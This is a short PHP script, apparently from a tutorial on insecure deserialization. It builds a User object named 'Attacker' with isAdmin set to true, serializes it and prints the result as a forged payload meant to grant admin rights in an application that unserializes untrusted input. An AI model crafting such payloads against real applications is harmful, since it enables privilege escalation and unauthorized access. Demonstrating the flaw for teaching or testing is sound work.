<?php
// 构造恶意数据
class User {
    public $name;
    public $isAdmin;

    public function __construct($name, $isAdmin) {
        $this->name = $name;
        $this->isAdmin = $isAdmin;
    }
}

$maliciousUser = new User("Attacker", true);
$maliciousData = serialize($maliciousUser);
echo $maliciousData;
?>
